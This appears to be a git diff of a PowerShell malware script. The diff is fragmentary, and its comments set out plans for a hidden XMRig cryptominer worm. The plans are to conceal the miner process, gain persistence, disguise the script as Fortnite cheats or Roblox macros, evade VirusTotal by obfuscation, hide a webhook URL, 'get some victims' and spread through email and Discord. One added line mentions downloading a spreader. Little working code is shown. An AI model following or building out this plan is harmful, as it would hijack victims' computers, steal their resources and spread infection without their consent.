@@ -1,14 +1,14 @@
 # persistence needed (fileless registry persistence?)
 # make xmrig undetected somehow (fileless miner ?) however it does detect the process not the actual file, so just i reckon make the process hidden (run it as admin so its not killable in task manager)
-# dont display the cmd window
-# make xmrig not be a blank screen but just not appear
+# dont display the cmd window /
+# make xmrig not be a blank screen but just not appear /
 # package it up into some cheats for fortnite or sum
 # maybe roblox macros 
 # fix virus total (add loads of gobbeldy gook vars in original.ps1)
 # remove these comments lmao
-# make the webhook url encoded b64 so script kiddies cant spam that shit
+# make the webhook url encoded b64 so script kiddies cant spam that shit 
 # get some victims.
-# spread via email and discord 
+# spread via email and discord ..
 # be a good little worm...
 
 $pcName     = $env:COMPUTERNAME;
@@ -113,4 +113,5 @@ else{
     } else {
         & $exePath
     }
+    # download a file that spreads it
 }
